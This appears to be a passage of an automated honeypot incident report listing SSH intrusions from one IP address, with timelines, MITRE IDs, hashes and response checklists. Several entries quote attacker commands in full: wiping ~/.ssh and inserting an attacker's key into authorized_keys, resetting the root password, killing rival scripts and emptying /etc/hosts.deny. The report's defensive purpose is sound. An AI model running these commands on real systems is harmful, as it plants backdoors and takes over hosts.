| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:14:53` | `cowrie.session.connect` |
| `2026-06-02 18:14:53` | `cowrie.client.version` |
| `2026-06-02 18:14:53` | `cowrie.client.kex` |
| `2026-06-02 18:14:54` | `cowrie.login.success` |
| `2026-06-02 18:14:55` | `cowrie.session.params` |
| `2026-06-02 18:14:55` | `cowrie.command.input` |
| `2026-06-02 18:14:55` | `cowrie.command.failed` |
| `2026-06-02 18:14:55` | `cowrie.log.closed` |
| `2026-06-02 18:14:56` | `cowrie.session.params` |
| `2026-06-02 18:14:56` | `cowrie.command.input` |
| `2026-06-02 18:14:56` | `cowrie.session.file_download` |
| `2026-06-02 18:14:56` | `cowrie.log.closed` |
| `2026-06-02 18:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d860cda49da2

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:15 |
| **Last Seen** | 2026-06-02 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:15:03` | `cowrie.session.connect` |
| `2026-06-02 18:15:03` | `cowrie.client.version` |
| `2026-06-02 18:15:03` | `cowrie.client.kex` |
| `2026-06-02 18:15:03` | `cowrie.login.success` |
| `2026-06-02 18:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76ac940419d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:16 |
| **Last Seen** | 2026-06-02 18:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:16:51` | `cowrie.session.connect` |
| `2026-06-02 18:16:51` | `cowrie.client.version` |
| `2026-06-02 18:16:51` | `cowrie.client.kex` |
| `2026-06-02 18:16:52` | `cowrie.login.success` |
| `2026-06-02 18:16:52` | `cowrie.session.params` |
| `2026-06-02 18:16:52` | `cowrie.command.input` |
| `2026-06-02 18:16:52` | `cowrie.command.failed` |
| `2026-06-02 18:16:53` | `cowrie.log.closed` |
| `2026-06-02 18:16:53` | `cowrie.session.params` |
| `2026-06-02 18:16:53` | `cowrie.command.input` |
| `2026-06-02 18:16:53` | `cowrie.session.file_download` |
| `2026-06-02 18:16:53` | `cowrie.log.closed` |
| `2026-06-02 18:17:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb13098bb341

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:16 |
| **Last Seen** | 2026-06-02 18:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:16:55` | `cowrie.session.connect` |
| `2026-06-02 18:16:55` | `cowrie.client.version` |
| `2026-06-02 18:16:55` | `cowrie.client.kex` |
| `2026-06-02 18:17:00` | `cowrie.login.success` |
| `2026-06-02 18:17:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c70f615399

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:19 |
| **Last Seen** | 2026-06-02 18:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:19:28` | `cowrie.session.connect` |
| `2026-06-02 18:19:28` | `cowrie.client.version` |
| `2026-06-02 18:19:28` | `cowrie.client.kex` |
| `2026-06-02 18:19:30` | `cowrie.login.success` |
| `2026-06-02 18:19:30` | `cowrie.session.params` |
| `2026-06-02 18:19:30` | `cowrie.command.input` |
| `2026-06-02 18:19:30` | `cowrie.command.failed` |
| `2026-06-02 18:19:30` | `cowrie.log.closed` |
| `2026-06-02 18:19:30` | `cowrie.session.params` |
| `2026-06-02 18:19:30` | `cowrie.command.input` |
| `2026-06-02 18:19:32` | `cowrie.session.file_download` |
| `2026-06-02 18:19:32` | `cowrie.log.closed` |
| `2026-06-02 18:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36dfeb09fe36

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:19 |
| **Last Seen** | 2026-06-02 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:19:36` | `cowrie.session.connect` |
| `2026-06-02 18:19:36` | `cowrie.client.version` |
| `2026-06-02 18:19:37` | `cowrie.client.kex` |
| `2026-06-02 18:19:37` | `cowrie.login.success` |
| `2026-06-02 18:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf614166255b

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:31 |
| **Last Seen** | 2026-06-02 18:32 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:31:27` | `cowrie.session.connect` |
| `2026-06-02 18:31:27` | `cowrie.client.version` |
| `2026-06-02 18:31:27` | `cowrie.client.kex` |
| `2026-06-02 18:31:28` | `cowrie.login.success` |
| `2026-06-02 18:31:29` | `cowrie.session.params` |
| `2026-06-02 18:31:29` | `cowrie.command.input` |
| `2026-06-02 18:31:29` | `cowrie.command.failed` |
| `2026-06-02 18:31:29` | `cowrie.log.closed` |
| `2026-06-02 18:31:29` | `cowrie.session.params` |
| `2026-06-02 18:31:29` | `cowrie.command.input` |
| `2026-06-02 18:31:30` | `cowrie.session.file_download` |
| `2026-06-02 18:31:30` | `cowrie.log.closed` |
| `2026-06-02 18:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e648f3010c

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:31 |
| **Last Seen** | 2026-06-02 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:31:33` | `cowrie.session.connect` |
| `2026-06-02 18:31:33` | `cowrie.client.version` |
| `2026-06-02 18:31:33` | `cowrie.client.kex` |
| `2026-06-02 18:31:34` | `cowrie.login.success` |
| `2026-06-02 18:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34786790f65d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:35 |
| **Last Seen** | 2026-06-02 18:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:35:25` | `cowrie.session.connect` |
| `2026-06-02 18:35:25` | `cowrie.client.version` |
| `2026-06-02 18:35:25` | `cowrie.client.kex` |
| `2026-06-02 18:35:28` | `cowrie.login.success` |
| `2026-06-02 18:35:28` | `cowrie.session.params` |
| `2026-06-02 18:35:28` | `cowrie.command.input` |
| `2026-06-02 18:35:28` | `cowrie.command.failed` |
| `2026-06-02 18:35:28` | `cowrie.log.closed` |
| `2026-06-02 18:35:29` | `cowrie.session.params` |
| `2026-06-02 18:35:29` | `cowrie.command.input` |
| `2026-06-02 18:35:29` | `cowrie.session.file_download` |
| `2026-06-02 18:35:29` | `cowrie.log.closed` |
| `2026-06-02 18:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd83e9be4012

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:35 |
| **Last Seen** | 2026-06-02 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:35:31` | `cowrie.session.connect` |
| `2026-06-02 18:35:31` | `cowrie.client.version` |
| `2026-06-02 18:35:31` | `cowrie.client.kex` |
| `2026-06-02 18:35:31` | `cowrie.login.success` |
| `2026-06-02 18:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d02ab393f79

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:37 |
| **Last Seen** | 2026-06-02 18:38 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:6J4YdoIEcaTM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:37:23` | `cowrie.session.connect` |
| `2026-06-02 18:37:23` | `cowrie.client.version` |
| `2026-06-02 18:37:23` | `cowrie.client.kex` |
| `2026-06-02 18:37:24` | `cowrie.login.success` |
| `2026-06-02 18:37:24` | `cowrie.session.params` |
| `2026-06-02 18:37:24` | `cowrie.command.input` |
| `2026-06-02 18:37:24` | `cowrie.command.failed` |
| `2026-06-02 18:37:24` | `cowrie.log.closed` |
| `2026-06-02 18:37:25` | `cowrie.session.params` |
| `2026-06-02 18:37:25` | `cowrie.command.input` |
| `2026-06-02 18:37:25` | `cowrie.session.file_download` |
| `2026-06-02 18:37:25` | `cowrie.log.closed` |
| `2026-06-02 18:37:37` | `cowrie.session.params` |
| `2026-06-02 18:37:37` | `cowrie.command.input` |
| `2026-06-02 18:37:38` | `cowrie.log.closed` |
| `2026-06-02 18:37:47` | `cowrie.session.params` |
| `2026-06-02 18:37:47` | `cowrie.command.input` |
| `2026-06-02 18:37:48` | `cowrie.log.closed` |
| `2026-06-02 18:37:49` | `cowrie.session.params` |
| `2026-06-02 18:37:49` | `cowrie.command.input` |
| `2026-06-02 18:37:50` | `cowrie.session.file_download` |
| `2026-06-02 18:37:50` | `cowrie.log.closed` |
| `2026-06-02 18:37:50` | `cowrie.session.params` |
| `2026-06-02 18:37:50` | `cowrie.command.input` |
| `2026-06-02 18:37:50` | `cowrie.log.closed` |
| `2026-06-02 18:37:50` | `cowrie.session.params` |
| `2026-06-02 18:37:50` | `cowrie.command.input` |
| `2026-06-02 18:37:52` | `cowrie.log.closed` |
| `2026-06-02 18:37:53` | `cowrie.session.params` |
| `2026-06-02 18:37:53` | `cowrie.command.input` |
| `2026-06-02 18:37:53` | `cowrie.command.input` |
| `2026-06-02 18:37:53` | `cowrie.log.closed` |
| `2026-06-02 18:37:53` | `cowrie.session.params` |
| `2026-06-02 18:37:53` | `cowrie.command.input` |
| `2026-06-02 18:37:54` | `cowrie.log.closed` |
| `2026-06-02 18:37:54` | `cowrie.session.params` |
| `2026-06-02 18:37:54` | `cowrie.command.input` |
| `2026-06-02 18:37:54` | `cowrie.log.closed` |
| `2026-06-02 18:37:55` | `cowrie.session.params` |
| `2026-06-02 18:37:55` | `cowrie.command.input` |
| `2026-06-02 18:37:55` | `cowrie.log.closed` |
| `2026-06-02 18:37:55` | `cowrie.session.params` |
| `2026-06-02 18:37:55` | `cowrie.command.input` |
| `2026-06-02 18:37:56` | `cowrie.log.closed` |
| `2026-06-02 18:37:57` | `cowrie.session.params` |
| `2026-06-02 18:37:57` | `cowrie.command.input` |
| `2026-06-02 18:37:57` | `cowrie.log.closed` |
| `2026-06-02 18:37:58` | `cowrie.session.params` |
| `2026-06-02 18:37:58` | `cowrie.command.input` |
| `2026-06-02 18:37:58` | `cowrie.log.closed` |
| `2026-06-02 18:37:59` | `cowrie.session.params` |
| `2026-06-02 18:37:59` | `cowrie.command.input` |
| `2026-06-02 18:38:01` | `cowrie.log.closed` |
| `2026-06-02 18:38:01` | `cowrie.session.params` |
| `2026-06-02 18:38:01` | `cowrie.command.input` |
| `2026-06-02 18:38:01` | `cowrie.log.closed` |
| `2026-06-02 18:38:02` | `cowrie.session.params` |
| `2026-06-02 18:38:02` | `cowrie.command.input` |
| `2026-06-02 18:38:02` | `cowrie.log.closed` |
| `2026-06-02 18:38:03` | `cowrie.session.params` |
| `2026-06-02 18:38:03` | `cowrie.command.input` |
| `2026-06-02 18:38:03` | `cowrie.log.closed` |
| `2026-06-02 18:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f58307aad92f

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-02 18:41 |
| **Last Seen** | 2026-06-02 18:41 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DwGdOELE1bAm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:41:20` | `cowrie.session.connect` |
| `2026-06-02 18:41:20` | `cowrie.client.version` |
| `2026-06-02 18:41:20` | `cowrie.client.kex` |
| `2026-06-02 18:41:21` | `cowrie.login.success` |
| `2026-06-02 18:41:21` | `cowrie.session.params` |
| `2026-06-02 18:41:21` | `cowrie.command.input` |
| `2026-06-02 18:41:21` | `cowrie.command.failed` |
| `2026-06-02 18:41:22` | `cowrie.log.closed` |
| `2026-06-02 18:41:22` | `cowrie.session.params` |
| `2026-06-02 18:41:22` | `cowrie.command.input` |
| `2026-06-02 18:41:22` | `cowrie.session.file_download` |
| `2026-06-02 18:41:22` | `cowrie.log.closed` |
| `2026-06-02 18:41:31` | `cowrie.session.params` |
| `2026-06-02 18:41:31` | `cowrie.command.input` |
| `2026-06-02 18:41:31` | `cowrie.log.closed` |
| `2026-06-02 18:41:33` | `cowrie.session.params` |
| `2026-06-02 18:41:33` | `cowrie.command.input` |
| `2026-06-02 18:41:33` | `cowrie.log.closed` |
| `2026-06-02 18:41:33` | `cowrie.session.params` |
| `2026-06-02 18:41:33` | `cowrie.command.input` |
| `2026-06-02 18:41:33` | `cowrie.session.file_download` |
| `2026-06-02 18:41:33` | `cowrie.log.closed` |
| `2026-06-02 18:41:34` | `cowrie.session.params` |
| `2026-06-02 18:41:34` | `cowrie.command.input` |
| `2026-06-02 18:41:38` | `cowrie.log.closed` |
| `2026-06-02 18:41:38` | `cowrie.session.params` |
| `2026-06-02 18:41:38` | `cowrie.command.input` |
| `2026-06-02 18:41:39` | `cowrie.log.closed` |
| `2026-06-02 18:41:39` | `cowrie.session.params` |
| `2026-06-02 18:41:39` | `cowrie.command.input` |
| `2026-06-02 18:41:39` | `cowrie.command.input` |
| `2026-06-02 18:41:39` | `cowrie.log.closed` |
| `2026-06-02 18:41:40` | `cowrie.session.params` |
| `2026-06-02 18:41:40` | `cowrie.command.input` |
| `2026-06-02 18:41:40` | `cowrie.log.closed` |
| `2026-06-02 18:41:40` | `cowrie.session.params` |
| `2026-06-02 18:41:40` | `cowrie.command.input` |
| `2026-06-02 18:41:45` | `cowrie.log.closed` |
| `2026-06-02 18:41:45` | `cowrie.session.params` |
| `2026-06-02 18:41:45` | `cowrie.command.input` |
| `2026-06-02 18:41:45` | `cowrie.log.closed` |
| `2026-06-02 18:41:45` | `cowrie.session.params` |
| `2026-06-02 18:41:45` | `cowrie.command.input` |
| `2026-06-02 18:41:46` | `cowrie.log.closed` |
| `2026-06-02 18:41:46` | `cowrie.session.params` |
| `2026-06-02 18:41:46` | `cowrie.command.input` |
| `2026-06-02 18:41:46` | `cowrie.log.closed` |
| `2026-06-02 18:41:47` | `cowrie.session.params` |
| `2026-06-02 18:41:47` | `cowrie.command.input` |
| `2026-06-02 18:41:47` | `cowrie.log.closed` |
| `2026-06-02 18:41:48` | `cowrie.session.params` |
| `2026-06-02 18:41:48` | `cowrie.command.input` |
| `2026-06-02 18:41:48` | `cowrie.log.closed` |
| `2026-06-02 18:41:48` | `cowrie.session.params` |
| `2026-06-02 18:41:48` | `cowrie.command.input` |
| `2026-06-02 18:41:49` | `cowrie.log.closed` |
| `2026-06-02 18:41:49` | `cowrie.session.params` |
| `2026-06-02 18:41:49` | `cowrie.command.input` |
| `2026-06-02 18:41:49` | `cowrie.log.closed` |
| `2026-06-02 18:41:51` | `cowrie.session.params` |
| `2026-06-02 18:41:51` | `cowrie.command.input` |
| `2026-06-02 18:41:51` | `cowrie.log.closed` |
| `2026-06-02 18:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62162af7415f

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]52` |
| **First Seen** | 2026-06-02 18:46 |
| **Last Seen** | 2026-06-02 18:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
